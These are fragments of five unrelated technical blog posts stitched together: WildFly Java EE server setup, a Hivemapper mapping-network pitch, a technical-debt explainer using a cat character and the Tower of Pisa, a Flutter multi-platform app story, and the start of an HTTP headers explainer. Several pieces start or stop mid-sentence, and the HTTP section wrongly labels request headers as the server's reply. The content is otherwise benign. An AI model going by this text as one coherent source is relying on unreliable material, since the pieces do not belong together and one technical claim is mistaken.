<li><strong>Docker Compose</strong> - for running the database locally</li>
<li><strong>IntelliJ</strong></li>
</ul>
<a href="#wildfly-setup"></a>
<p>Start out by downloading the <strong>JBoss WildFly 20.0.0.Final</strong> application server (Java EE Full &amp; Web Distribution)
from the official <a href="https://www.wildfly.org/downloads/">downloads page</a>.
Once it's downloaded, unzip the the archive to a convenient location or simply leave it
inside your <code>~/Downloads/</code> folder (which is what I will do).</p>
<p>I shall refer to the WildFly root directory as <code>$JBOSS_HOME</code> from now on,
which would resolve to <code>~/Downloads/wildfly-20.0.0.Final/</code> on my system.</p>
<p>To <em>start</em> this server, simply <code>cd</code> into the <code>$JBOSS_HOME/bin/</code> folder and run the <code>./standalone.sh</code> script.
After a few seconds, you should be able to visit <a href="http://localhost:8080/">localhost:8080</a>
and be greeted with the following welcome screen.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/wildfly-welcome-screen.png" alt="WildFly welcome screen"></p>
<p>(To stop the server,
simply press Cmd + C or Ctrl + C from the terminal window where the <code>./standalone.sh</code> script is running.)</p>
<p>WildFly also comes with a useful management dashboard, available at <a href="http://localhost:9990/">localhost:9990</a>,
from where we'll be able to view runtime stats about WildFly itself and all Java EE applications deployed to it.
In order to access the dashboard, we'll have to create a management user first, though.
To do so, <code>cd</code> into <code>$JBOSS_HOME/bin/</code> and run the <code>./add-user.sh</code> script.</p>

We take them for granted and yet they’re critical and everywhere. But maps cost billions to produce and therefore don’t get updated frequently enough for businesses and machines that require up-to-date data.</p><p id="a0c7">To create a fresh and intelligent 3D map of the world, <a href="http://hivemapper.com/" rel="noopener">Hivemapper</a> combines a new software approach to making maps, with a <a href="https://hivemapper.com/collectors" rel="noopener">mapping network</a> of commodity drones and <a href="https://hivemapper.com/open-dash" rel="noopener">dashcam</a> to grow and update the map. The global 3D map we are building is scaling and updating four times faster, and at a fraction of the cost, of traditional mapping companies.</p><p id="2123">By comparison, where Google Maps deploys a small number of highly specialized cars driving around the world, we engage with an unlimited number of contributors who only need a dashcam or off-the-shelf drone to participate. Here’s a quick peek:</p></div></div><div><div><p id="255d">Since February 2020, collectors in the Hivemapper mapping network have been rapidly adding to and growing the global map:</p><ul><li id="8835"><strong>9,000 sq km </strong>— in more than 80 countries — have been mapped</li><li id="7fa3"><strong>50% monthly growth</strong> of the global map</li><li id="248f">In just one week, areas of the map have grown from <strong>1 to 90 sq. km</strong> — about three Manhattans</li></ul><p id="214d">Hivemapper regards a decentralized mapping network as critical mapping infrastructure necessary to democratize mapping, make mapping a utility like storage and bandwidth, and fuel the business use-cases and autonomous machines that require up-to-date 3D maps.</p><p id="5fbc">In a static world — no new roads, no closures, no natural disasters, no new development existing approaches to building and updating 2D and 3D maps are satisfactory. Yet, the physical world is changing faster than ever. Urbanization, climate change, autonomous transportation, and now pandemics are driving 15% of the global road network to change annually.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*bvdIk7dlMi1TC6r_baxykg.png" width="2280" height="1288" srcset="https://miro.medium.com/max/552/1*bvdIk7dlMi1TC6r_baxykg.png 276w, https://miro.medium.com/max/1104/1*bvdIk7dlMi1TC6r_baxykg.png 552w, https://miro.medium.com/max/1280/1*bvdIk7dlMi1TC6r_baxykg.png 640w, https://miro.medium.com/max/1400/1*bvdIk7dlMi1TC6r_baxykg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*bvdIk7dlMi1TC6r_baxykg.png?q=20"></p></div></div></div><figcaption>The world is changes faster, and today’s maps cannot keep up</figcaption></figure><p id="49e3">Today, Big Tech mapping companies spend billions of dollars to deploy fleets of highly specialized vehicles, fly airplanes equipped with advanced camera systems, and even launch satellites. Given the enormous expense, maps are rarely updated and companies apply expensive and restrictive licensing agreements to their use. For businesses that rely on maps for mission critical monitoring and navigation an out-of-date map is a serious issue:</p><ul><li id="f163">Google Maps was not updated for 12 months after the devastating fires in Santa Rosa (California) destroyed homes and infrastructure.</li><li id="89a6">Because Google and others are too slow to update, a delivery company operating in the Detroit area had to collect their own data for maps using multiple tools.</li><li id="750d">Each year 20% of structures in Dallas change; a delivery company hires teams of people to manually update these to reduce costly rejected deliveries.</li></ul><p id="2b88">However important maps already are, updated 3D maps are a mission critical piece of infrastructure for the navigation systems of autonomous vehicles. Feeding an out-of-date map to an autonomous vehicle is potentially catastrophic. The lack of large scale affordable and accurate 3D maps remain a key obstacle preventing the autonomous transportation promise from becoming an everyday reality.</p><p id="673f">We believe there are three pillars required to build and deliver a decentralized mapping network capable of turning 3D maps into an affordable and accessible utility for businesses and machines that require up-to-date maps.</p><p id="b314">When anyone with a commodity dashcam or drone can collect and contribute video it shifts the challenge from a costly logistics and hardware problem into a challenging software opportunity.</p><p id="1ba7">The <a rel="noopener" href="https://blog.hivemapper.com/engineering-a-living-map-introduction-4d4b3e5f28e8">technical breakthrough</a> of Hivemapper is that, leveraging modern compute power we can take nearly any source video of the physical world and convert it into an accurate 3D map. Additionally, the Hivemapper technology does not require all of the video to be produced by one source in a highly structured and organized way. Instead, Hivemapper receives, processes and transforms disparate videos into an accurate and intelligent 3D map.</p><p id="22f6">Think of the Hivemapper map as a puzzle where each video uploaded to Hivemapper forms one piece. The puzzle is only complete when each piece is in its proper place and Hivemapper makes all of the individual pieces come together. This core technology enables a decentralized network of contributors.</p><p id="e3d4">Our approach combining commodity video collections tools from different collectors with our mapping software produced this 50 sq km map around <a href="https://hivemapper.com/map?content=terrain&amp;content=context&amp;content=hmmap&amp;content-filters=color,highacc&amp;overlays=osm-planet&amp;view=-2698768.77,-4293712.18,3856567.37,-2.296,-0.709" rel="noopener">Stanford University</a>:</p></div></div><div><div><div><figure><div></div><figcaption>50 sq km of Silicon Valley built by dashcam and drones</figcaption></figure></div></div></div><div><div><p id="abad">How we built this map</p><ul><li id="9681">5 different video collectors, separately and on different days, collected video and uploaded to Hivemapper.com</li><li id="a577">The collectors used 3 different brands and types of commodity drones and dashcam: DJI, Autel, and Blackvue</li></ul><h2 id="8876"><strong><em>Cost effective</em></strong></h2><p id="23eb">Transforming the collected video into a 3D map is compute intensive. Over the last few years, we have devised novel ways to reduce the compute cost of creating the map enabling us to scale economically. Just in the last few months we have reduced the cost to compute by an additional 60% — a cost that will come down materially with additional scale.</p><p id="bf41">Because Hivemapper is designed to work in the cloud and at the edge from inception. Everything on <a href="http://hivemapper.com/map" rel="noopener">Hivemapper.com</a> can be deployed on a high-end gaming PC. When maps are produced on-premise, we spread the compute costs across many thousands of devices that are otherwise sitting idle.</p><p id="73d8">Our platform allows us to move more of the processing to the edge. All maps produced at the edge can be merged into the global 3D map hosted at <a href="http://hivemapper.com/" rel="noopener">hivemapper.com</a>. In 2021, we will take another big leap in reducing compute costs. Stay tuned.</p><p id="8aa6">The Hivemapper map is built from video collected by commodity drones, empowering virtually anyone to become a collector and earn additional income. Our approach provides an affordable, accessible alternative to the expensive and specialized mapping vehicles and satellites.</p><p id="673a">Earlier approaches to crowdsourced mapping required learning complex GIS interfaces involving tedious amounts of tracing lines across stale satellite imagery. Collecting video for the Hivemapper map can be done, simply, by anyone with a drone or dashcam.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*zhFzxKRcknjxZkvYcIxjAg.png" width="2280" height="1284" srcset="https://miro.medium.com/max/552/1*zhFzxKRcknjxZkvYcIxjAg.png 276w, https://miro.medium.com/max/1104/1*zhFzxKRcknjxZkvYcIxjAg.png 552w, https://miro.medium.com/max/1280/1*zhFzxKRcknjxZkvYcIxjAg.png 640w, https://miro.medium.com/max/1456/1*zhFzxKRcknjxZkvYcIxjAg.png 728w, https://miro.medium.com/max/1632/1*zhFzxKRcknjxZkvYcIxjAg.png 816w, https://miro.medium.com/max/1808/1*zhFzxKRcknjxZkvYcIxjAg.png 904w, https://miro.medium.com/max/1984/1*zhFzxKRcknjxZkvYcIxjAg.png 992w, https://miro.medium.com/max/2000/1*zhFzxKRcknjxZkvYcIxjAg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*zhFzxKRcknjxZkvYcIxjAg.png?q=20"></p></div></div></div><figcaption>Hivemapper mapping network</figcaption></figure></div></div></div><div><div><p id="868d">Drone pilots are growing the Hivemapper map from the air with $1,000 drones that have meaningful advantages compared over multi-million dollar satellites. Drones fly a few hundred feet above ground level producing a higher resolution map. Unlike a satellite, drone can easily fly below clouds, fog, and smoke as needed, and can see areas that satellites cannot see.</p><p id="f3ce">In 2021, to move even closer to the action at the street-level we will add dashcams as a new mode of video collection.

            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>

<p><em>“One day, 7 apps, of course… How long was that day? 168 hours? Define ‘one day’!"</em><br>
Are you looking for the <a href="#definition-of-one-day">definition</a>?</p>
<h2 id="the-story">The Story</h2>
<p>Usually, every product story starts with a pain, a problem that needs to be solved. A problem that bothers you, annoys you, you face it frequently and probably you are not alone with it.<br>
This case was not different either.</p>
<p>A few months ago we started to use a new HR system that has a lot of advantages compared to the old one. But it had disadvantages too… Missing functionality, missing information… or the information is there, but hard to get it out from the system.</p>
<p>That’s when the idea of <a href="https://pandoo.tweaked.tech/">Pandoo</a> (the holiday planner) was born.</p>
<figure>
<a href="https://pandoo.tweaked.tech/">

</a>
</figure>
<h2 id="the-problem">The Problem</h2>
<p>The new tool did lack some features that we got used to.</p>
<p>A nice(r) and clean(er) way to see all of your holidays, your team’s holidays (and type of those holidays), and book them in a bunch.</p>
<p><strong>Disclaimer:</strong> <em>Maybe some of these problems are manageable with admin configurations or with educating the users.. but usually, when people switch tools they just expect that “it works” and they have all the things they had previously plus nice extras.</em></p>
<p><em>The goal of this article is not to blame the tool, it is about the solution and the key learnings.</em></p>
<h2 id="the-solution">The Solution</h2>
<p>I wanted to bring back the functionalities from the old tool. I wanted to see my holidays as I was used to, I wanted to book my holidays as I used to. And I was not alone with this.</p>
<h3 id="the-requirements">The Requirements</h3>
<ul>
<li>I don’t want to waste too much time on the MVP, just get it to work with the basic functionality and make me happy.</li>
<li>There is no way that I will build multiple apps using multiple programming languages.</li>
<li>Mobile-first, but bigger screen support would be nice where I can see more data.</li>
<li>Challenge myself.</li>
</ul>
<h3 id="the-choice">The Choice</h3>
<h4 id="flutter">Flutter</h4>
<figure>
<img src="https://danieldallos.com/images/flutter-pandoo/flutter.png" alt="Flutter logo">
</figure>
<p>Why?</p>
<ul>
<li>Flutter’s promise</li>
</ul>
<p><a href="https://flutter.dev/">Flutter</a> is a cross-platform tool made by Google, that helps you <strong>build native mobile apps from a single codebase</strong>.<br>
<em>(Edit (19/09/2020): This has been changed a bit as you will see it later. )</em></p>
<ul>
<li>I had some experiences already.</li>
</ul>
<p>I have built <a href="http://edengreen.tweaked.tech/">Edengreen</a>, a tool that helps you check your available meal vouchers.<br>
It is a really basic app, but it taught me the basics of how Flutter works. At this time Flutter was still in beta.</p>
<p>One of my other projects was <a href="https://coronavirusalert.tweaked.tech/">CoronaVirus Alert</a>, a tool that monitors the infections country by country and sends you push notifications.<br>
In this project, I have played with Firebase, serverless functions, and custom scripts here and there. I have learned that there is a <strong>big pool of third-party libraries</strong> for Flutter and <strong>the community is growing rapidly</strong> too.</p>
<ul>
<li>Web support</li>
</ul>
<p>I have never tried, but apparently, there was rudimentary Web support too.</p>
<ul>
<li>The challenge</li>
</ul>
<p>My previous projects helped me to understand the basics but I wanted to achieve more and the Web support was sounded interesting too.</p>
<h3 id="know-your-stuff">Know Your Stuff</h3>
<p>I needed a giant scrollable table view where horizontally I can show the days of the year and vertically all of my colleagues and their holidays.<br>
This sounds easy, but in reality, it never is. Weird, annoying edge-cases when you are almost done, lack of Flutter knowledge from my side, unforeseen platform limitations, etc…</p>
<p>I wanted to see what is available already by the community, maybe there is something that is similar and it can fit my needs (with minimal tweaking). Luckily I have found the <a href="https://pub.dev/packages/horizontal_data_table">horizontal_data_table</a> package, that provided 90% of what I have needed… I have forked the package and did some fine-tuning for my needs on the way.</p>
<p>Getting the data from the HR tool was pretty easy, they provide a nice REST API to interact with the back-end.</p>
<p>When you connect the dots you have to be cautious. You need to know what you expect from your tool, how it is going to work. How does it get the data? Do we need to store the data locally? Do we need an extra server-side logic too? Do we plan to use any exotic UI elements?</p>
<p>These are important questions, because when you pick a library/package in Flutter and e.g. if it works on Android it does not mean automatically that it works on iOS too… or even on the Web. You need to pick libraries that rely on the default native support and no additional native third-party libraries. (Or the reliance on those libraries needs to be complete on every side.)</p>
<p>For example, if you would like to use Firebase services in your app, you need to check which platforms <a href="https://github.com/FirebaseExtended/flutterfire">are supported</a>. <strong>If your target is not, probably you will face a runtime crash when Flutter tries to access the non-existent APIs.</strong></p>
<p>When you search for a Flutter package in the official <a href="https://pub.dev/">Dart/Flutter package repository</a>, you can also see which platforms are supported.</p>

</a>
</figure>
<h3 id="3-apps-at-once">3 Apps at Once</h3>
<p>Based on past experiences in the MVP I did not choose any special external library (except the horizontal_data_table) because I wanted to limit the compatibility issues between iOS, Android, and Web.</p>
<p>After I was done with the minimal version, I tested the implementation on Android and iOS.<br>
It worked and looked nice! (Sure, it had some performance issues here and there while scrolling through the holidays of the whole company… but on a limited dataset it was good.)</p>

<p>So now we have <strong>two apps</strong> ready to use!</p>
<p>Let’s see how it works on the Web.<br>
Of course, it crashed in a few places 😀.
But nothing serious that a good old “if-else” could not solve. I have still used some APIs that were not available on the Web, so I needed to use <code>kIsWeb</code> <a href="https://api.flutter.dev/flutter/foundation/kIsWeb-constant.html">constant</a> to differ the logic between Web and native mobile.</p>
<p>It also had some UI quirks due to unsupported/buggy UI elements (<a href="https://github.com/flutter/flutter/issues/45505">with gradients</a>), but it was good enough for the current phase.</p>

</figure>
<p>We have the <strong>third app</strong> too, and you could say <em>“Ok, you are done, you have it all, Web runs on all platforms”</em>.</p>
<p>But wait, there is more!</p>
<h3 id="the-meetup-and-the-extra-3-apps">The Meetup and The Extra 3 Apps</h3>
<p>I really like Meetups. I can meet with like-minded people, listen to good and interesting presentations, and sometimes <a href="https://www.meetup.com/gdg-brussels/photos/27573830/457831934/">I give a talk too</a> 😊.</p>
<p>There was a promising Meetup from <a href="https://www.meetup.com/gdg-brussels/events/268503398/">GDG Brussels on Flutter topic</a>. Based on the presentation summary, it intended to be a basic Flutter intro and the experiences of the author.<br>
So it could be nothing interesting for me, I am kinda done with the basics… but I always like to repeat similar things, because maybe I can discover a new bit of information that can change my perspective and start me thinking.
For the same reason, I read/listen to books on similar topics too… even the 95% is the same as a previous book, the remaining 5% is worth the time.</p>
<p><strong>Luckily this case was not different either.</strong><br>
The presenter walked through their app development challenges and how quickly they have re-implemented the apps from scratch in Flutter.</p>
<p>Then he showed something interesting. His app was in a weird-looking window. It looked like a browser or a bezel-less iOS simulator. Apparently, it was his application compiled into a <strong>native MacOS app</strong>. It turned out that Flutter added support for <a href="https://flutter.dev/desktop">Desktop</a> platforms. Obviously, this was even in an earlier stage than the Web support, but it is worth a try.</p>
<p>The next day I tried it, it worked! I had Pandoo as a native MacOS app. Meanwhile, I have discovered that there is also really basic support for Linux and Windows… After the initial setup of the environments in VirtualBox, I could compile Pandoo as a <strong>native Windows and Linux app</strong> too! 🎉</p>
<p>Sure, there were some extra limitations on Windows and Linux, I had to do some extra “if-else” conditions. E.g. there was no persistent storage API available on these platforms, so I could not save any data to the disk.<br>
<em>(Edit (19/09/2020): Later I did polyfill these missing features by using the default Dart file reading and writing APIs.)</em></p>
<p>Extra <strong>three apps are done</strong>. Sounds good, doesn’t it?</p>

<h3 id="1">+1</h3>
<p>We can argue on this if it counts as the seventh app or not. But it was such a nice surprise to me, so please allow me to count it as +1.</p>
<p>While I was testing Pandoo in the Chrome Browser on my phone, I got a popup that asked me if I would like to add Pandoo to my home screen. Sure, why not. But this icon on my home screen looked different from another page link. And… it also appeared between my apps in the Launcher. What?</p>
<p>It turned out that the <strong>Web apps built by Flutter are PWA applications</strong> too. So even if the device is offline, you can open and use the web apps.
Or, you could… if a webpage is made for that. In my case I don’t cache any data from the HR tool, I fetch all the data from the API every time.
That means when Pandoo is loaded inside the browser and you try to use it without an Internet connection, it shows an API error (just like all the other versions of the app). I could save the last fetched data locally and load it immediately at app start (while the new is loading)… but for now, it is ok as it is.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I think Flutter is a strong candidate in the app development era. Not only for mobile but in general.</p>
<p>I did not write a single line of code to have a Mac OSX app. Although I have some experiences with Mac OSX apps (<a href="https://mike.tweaked.tech/">Mike</a>) so I would have an idea where to start, it is not a copy/paste from an iOS app, you need to put some work there. Hopefully <a href="https://developer.apple.com/mac-catalyst/">Mac Catalyst</a> will help with this in the future.</p>
<p>Write an app for Windows and Linux? I would not even think about it.</p>
<p>The additional Web support is really nice, and it can be really useful. For example, if you have a Revolut and TransferWise account you probably noticed that the mobile apps are very similar to each other, and they also provide a Web version too with a limited feature set. I don’t know what technologies they use, but (if not Flutter already) I can imagine in the future these kinds of services will consider Flutter for their apps.</p>

October 23, 2020 | https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/ | <a href="https://web.archive.org/web/*/https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Almost everything in the web is sent with <strong>http</strong> and even non-developers have seen it when using the internet as keyword
inside urls or links.</p>
<p>Http stands for <strong>Hypertext Transfer Protocol</strong> and gives us the ability to transfer hypertext between a browser and a server.
This is a great technology that has been around almost since the invention of the web and is constantly evolving and
<a href="https://en.wikipedia.org/wiki/HTTP/2">offering more and more great features</a></p>

<p>As a developer you probably heard of http headers, at least in the moment you heard about the CORS policy.
This is a problem you must have heard about when developing websites.
But what exactly are http headers and what other ways are there to use them?</p>
<p>Let us first find out what they do and how you could use them. </p>
<p>When a browser requests a resource, for example a page of this blog, it asks the server with a request.
This request looks something like this: </p>
<div data-language="js"><pre><code><span>fetch</span><span>(</span><span>"https://www.lorenzweiss.de/race_conditions_explained/"</span><span>,</span> <span>{</span>
  credentials<span>:</span> <span>"include"</span><span>,</span>
  headers<span>:</span> <span>{</span>
    accept<span>:</span>
      <span>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><span>,</span>
    <span>"accept-language"</span><span>:</span> <span>"en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7"</span><span>,</span>
    <span>"cache-control"</span><span>:</span> <span>"max-age=0"</span><span>,</span>
    <span>"sec-fetch-mode"</span><span>:</span> <span>"navigate"</span><span>,</span>
    <span>"sec-fetch-site"</span><span>:</span> <span>"same-origin"</span><span>,</span>
    <span>"sec-fetch-user"</span><span>:</span> <span>"?1"</span><span>,</span>
    <span>"upgrade-insecure-requests"</span><span>:</span> <span>"1"</span><span>,</span>
  <span>}</span><span>,</span>
  referrerPolicy<span>:</span> <span>"no-referrer-when-downgrade"</span><span>,</span>
  body<span>:</span> <span>null</span><span>,</span>
  method<span>:</span> <span>"GET"</span><span>,</span>
  mode<span>:</span> <span>"cors"</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>So you can see the URL or location of the resource, some information about the request and also a lot of headers with some information about the request.
This is how your browser tells the server some more information about the request. For example what kind of data type it accepts or
how the client is handling the cache.</p>
<p>After sending the request, the server replies, and it also sets some headers in the reply, which could look like this: </p>
<div data-language="text"><pre><code>:authority: www.lorenzweiss.de
:method: GET
:path: /race_conditions_explained/
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-encoding: gzip, deflate, br
accept-language: en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7
cache-control: max-age=0
cookie: _ga=GA1.2.1173972759.1584812492; _gid=GA1.2.2076192721.1594044231
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
